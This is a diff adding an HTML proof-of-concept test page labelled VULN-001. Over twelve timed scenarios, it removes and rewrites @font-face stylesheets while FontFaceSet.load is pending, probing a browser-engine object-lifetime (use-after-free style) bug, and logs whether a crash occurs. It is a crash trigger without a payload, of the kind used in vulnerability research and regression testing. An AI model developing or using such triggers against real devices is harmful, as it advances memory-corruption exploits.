@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>VULN-001 CSSFontFaceSet FontFaceSet.load lifetime</title></head>
+<body><pre id="log">POC STARTED: VULN-001 CSSFontFaceSet
+</pre>
+<script>
+if (window.testRunner) { testRunner.dumpAsText(); testRunner.waitUntilDone(); }
+function log(m){ document.getElementById('log').textContent += m + '\n'; }
+let done=false;
+function finish(){ if(done) return; done=true; log('NO CRASH OBSERVED'); log('DONE'); if(window.testRunner) testRunner.notifyDone(); }
+function mutate(style, label){
+    log('PHASE: stylesheet mutation ' + label);
+    try { let sheet = style.sheet; log('ACTION: style.sheet ' + (sheet ? 'available' : 'null')); if (sheet) { let before = sheet.cssRules.length; log('ACTION: cssRules.length before ' + before); try { sheet.deleteRule(0); log('ACTION: deleteRule(0) succeeded'); } catch(e) { log('ACTION: deleteRule(0) threw ' + e.name); } log('ACTION: cssRules.length after ' + sheet.cssRules.length); } } catch(e) { log('ACTION: stylesheet access threw ' + e.name); }
+    try { style.textContent = '@font-face { font-family: "ps5-vuln001-mut-' + label + '"; src: local("MissingPS5Font"); }'; log('ACTION: style text replaced'); } catch(e) { log('ACTION: style replace threw ' + e.name); }
+    try { style.remove(); log('ACTION: style removal attempted'); } catch(e) { log('ACTION: style removal threw ' + e.name); }
+}
+async function scenario(i, timing){
+    log('PHASE: scenario ' + i + ' timing ' + timing);
+    let fam='ps5-vuln001-' + i;
+    let style=document.createElement('style');
+    style.textContent='@font-face { font-family: "' + fam + '"; src: local("MissingPS5Font"), url(data:font/woff;base64,AAE=) format("woff"); } body { font-family: "' + fam + '", sans-serif; }';
+    document.head.appendChild(style); log('ACTION: style appended');
+    let p;
+    try { p = document.fonts.load('16px "' + fam + '"', 'abc'); log('ACTION: document.fonts.load called'); } catch(e) { log('ACTION: document.fonts.load threw ' + e.name); mutate(style, 'load-throw'); return; }
+    if (timing === 'immediate') mutate(style, timing);
+    else if (timing === 'microtask') Promise.resolve().then(function(){ mutate(style, timing); });
+    else if (timing === 'raf') requestAnimationFrame(function(){ mutate(style, timing); });
+    else setTimeout(function(){ mutate(style, timing); }, 0);
+    try { await p; log('ACTION: font load promise resolved'); } catch(e) { log('ACTION: font load promise rejected ' + e.name); }
+}
+(async function run(){
+    log('PHASE: begin bounded scenarios');
+    let timings=['immediate','microtask','raf','timeout'];
+    for (let i=0;i<12;i++) await scenario(i, timings[i % timings.length]);
+    finish();
+})();
+setTimeout(function(){ log('PHASE: failsafe timeout'); finish(); }, 3000);
+</script></body></html>
